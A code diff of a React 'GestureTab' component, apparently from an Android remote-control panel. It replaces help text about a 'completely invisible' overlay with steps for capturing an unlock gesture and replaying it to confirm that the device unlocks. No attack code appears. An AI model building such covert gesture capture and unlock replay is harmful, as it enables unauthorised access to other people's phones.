@@ -606,13 +606,15 @@ export default function GestureTab({ device, sendCommand, results }) {
             </div>
             <div style={{ fontSize: 13, color: '#64748b', marginBottom: 10, lineHeight: 1.7 }}>
               Start capture, perform your gesture on the device, then press <strong style={{ color: '#e2e8f0' }}>Stop & Save</strong>.
-              The overlay is <strong style={{ color: '#e2e8f0' }}>completely invisible</strong> and works on all Android versions.
+              The system will <strong style={{ color: '#e2e8f0' }}>immediately replay</strong> the gesture and only keep it if the device unlocks.
             </div>
             <div style={{ fontSize: 12, color: '#475569', marginBottom: 14, padding: '8px 12px', background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b' }}>
               1. Press <strong style={{ color: '#94a3b8' }}>Start Auto-Capture</strong><br />
-              2. Perform your gesture on the device<br />
-              3. Press <strong style={{ color: '#94a3b8' }}>Stop & Save</strong> — gesture is saved automatically<br />
-              🚫 Simple tap (&lt;10 pts or &lt;150ms) → discarded
+              2. Perform your unlock gesture on the device<br />
+              3. Press <strong style={{ color: '#94a3b8' }}>Stop & Save</strong><br />
+              4. System replays gesture automatically<br />
+              ✅ Device unlocks → gesture is saved permanently<br />
+              ❌ Still locked → gesture is discarded automatically
             </div>
             <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
               <button
